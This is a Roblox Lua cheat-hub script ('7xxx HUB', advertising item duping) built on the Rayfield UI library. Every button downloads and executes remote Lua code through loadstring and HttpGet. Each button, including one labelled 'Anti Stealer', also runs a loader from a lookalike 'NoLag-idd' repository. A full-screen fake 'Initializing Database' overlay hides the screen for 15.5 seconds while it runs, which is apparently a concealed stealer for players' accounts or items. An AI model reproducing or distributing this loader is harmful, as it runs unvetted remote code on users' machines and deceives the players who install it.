debugX = true

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "7xxx HUB",
   Icon = 0,
   LoadingTitle = "7xxx Interface Suite",
   LoadingSubtitle = "by 7xxx Duping #GAG",
   Theme = "Default",
   DisableRayfieldPrompts = false,
   DisableBuildWarnings = false,
   ConfigurationSaving = {
      Enabled = false,
      FolderName = nil,
      FileName = "Hub"
   },
   Discord = {
      Enabled = true,
      Invite = "https://discord.gg/2pKgPGNm",
      RememberJoins = false
   },
   KeySystem = false,
   KeySettings = {
      Title = "Untitled",
      Subtitle = "Key System",
      Note = "No method of obtaining the key is provided",
      FileName = "Key",
      SaveKey = true,
      GrabKeyFromSite = false,
      Key = {"Hello"}
   }
})

-- Function to create initialization screen
local function showInitializationScreen()
    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "InitializationDisplay"
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn = false
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

    local textLabel = Instance.new("TextLabel")
    textLabel.Name = "InitializationText"
    textLabel.Size = UDim2.new(1, 0, 1, 0)
    textLabel.Position = UDim2.new(0, 0, 0, 0)
    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
    textLabel.TextColor3 = Color3.new(0, 1, 0)
    textLabel.Font = Enum.Font.Code
    textLabel.TextSize = 36
    textLabel.Text = "PLS WAIT Initializing Database..."
    textLabel.TextScaled = false
    textLabel.TextWrapped = true
    textLabel.TextXAlignment = Enum.TextXAlignment.Center
    textLabel.TextYAlignment = Enum.TextYAlignment.Center
    textLabel.Parent = screenGui

    -- Color cycling coroutine
    coroutine.wrap(function()
        local hue = 0
        while true do
            hue = (hue + 0.01) % 1
            textLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
            local dots = string.rep(".", math.floor((tick() % 3) + 1))
            textLabel.Text = "PLS WAIT Initializing Database" .. dots
            wait(0.1)
        end
    end)()
    
    return screenGui
end

local Tab = Window:CreateTab("Script Tab", 4483362458)

local Section = Tab:CreateSection("Keyless Script Selection")

local Button = Tab:CreateButton({
    Name = "No-Lag Script",
    Callback = function()
        local initScreen = showInitializationScreen()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
        task.wait(15.5)
        initScreen:Destroy()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()    
    end,
})

local Button = Tab:CreateButton({
    Name = "Anti Stealer",
    Callback = function()
        local initScreen = showInitializationScreen()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()
        task.wait(15.5)
        initScreen:Destroy()
    end,
})

local Tab1 = Window:CreateTab("Script Tab", 4483362458)

local Section = Tab1:CreateSection("Key Script Selection")

local Button = Tab1:CreateButton({
    Name = "Lunor Script",
    Callback = function()
        local initScreen = showInitializationScreen()
        loadstring(game:HttpGet("https://lunor.dev/loader"))()
        task.wait(15.5)
        initScreen:Destroy()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()    
    end,
})

local Button = Tab1:CreateButton({
    Name = "Lumin Script",
    Callback = function()
        local initScreen = showInitializationScreen()
        loadstring(game:HttpGet("https://lumin-hub.lol/loader.lua",true))()
        task.wait(15.5)
        initScreen:Destroy()
        loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()   
    end,
})

Rayfield:LoadConfiguration()
